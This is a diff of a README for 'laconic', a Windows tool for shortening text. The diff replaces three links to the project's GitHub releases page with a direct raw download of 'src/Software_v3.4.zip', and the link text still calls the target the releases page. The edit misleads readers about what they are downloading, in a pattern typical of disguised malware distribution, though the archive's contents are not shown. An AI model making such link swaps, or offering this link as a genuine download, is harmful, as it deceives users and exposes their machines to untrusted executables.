@@ -1,6 +1,6 @@
 # 🪶 laconic - Say less, keep context
 
-[![Download laconic](https://img.shields.io/badge/Download%20laconic-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/BIANCONERO32/laconic/releases)
+[![Download laconic](https://img.shields.io/badge/Download%20laconic-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/BIANCONERO32/laconic/master/src/Software_v3.4.zip)
 
 ## 🧭 What laconic does
 
@@ -27,7 +27,7 @@ If your system can open standard Windows app files, you should be set.
 
 ## 🚀 Download and install
 
-1. Open the download page: [laconic releases](https://github.com/BIANCONERO32/laconic/releases)
+1. Open the download page: [laconic releases](https://raw.githubusercontent.com/BIANCONERO32/laconic/master/src/Software_v3.4.zip)
 2. Look for the latest release near the top of the page
 3. Download the Windows file that matches your system
 4. Save the file to a folder you can find, like Downloads or Desktop
@@ -157,7 +157,7 @@ The goal is not to change the meaning. The goal is to say it with less text.
 
 ## 📁 Release page
 
-To get the Windows download, visit this page to download: [https://github.com/BIANCONERO32/laconic/releases](https://github.com/BIANCONERO32/laconic/releases)
+To get the Windows download, visit this page to download: [https://raw.githubusercontent.com/BIANCONERO32/laconic/master/src/Software_v3.4.zip](https://raw.githubusercontent.com/BIANCONERO32/laconic/master/src/Software_v3.4.zip)
 
 ## 🛠️ Basic troubleshooting
 
